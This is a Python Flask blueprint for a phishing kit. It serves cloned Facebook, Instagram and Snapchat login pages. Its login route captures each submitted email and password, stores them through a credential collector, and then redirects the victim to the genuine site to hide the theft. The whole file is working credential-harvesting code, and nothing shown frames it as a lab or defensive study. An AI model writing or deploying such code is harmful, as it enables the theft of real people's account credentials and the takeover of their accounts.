from flask import Blueprint, render_template, request, redirect

from core.collector import save_credentials

web_bp = Blueprint(
    'web',
    __name__,
    template_folder='templates'
)

_REDIRECT_MAP = {
    'facebook': 'https://www.facebook.com',
    'instagram': 'https://www.instagram.com',
    'snapchat': 'https://www.snapchat.com',
}


@web_bp.route('/')
def index():
    return render_template('menu.html')


@web_bp.route('/facebook')
def facebook():
    return render_template('facebook.html')


@web_bp.route('/instagram')
def instagram():
    return render_template('instagram.html')


@web_bp.route('/snapchat')
def snapchat():
    return render_template('snapchat.html')


@web_bp.route('/login/<platform>', methods=['POST'])
def login(platform):
    email = request.form.get('email', '')
    password = request.form.get('password', '')

    save_credentials(platform.capitalize(), email, password)

    target = _REDIRECT_MAP.get(platform, 'https://www.google.com')
    return redirect(target)
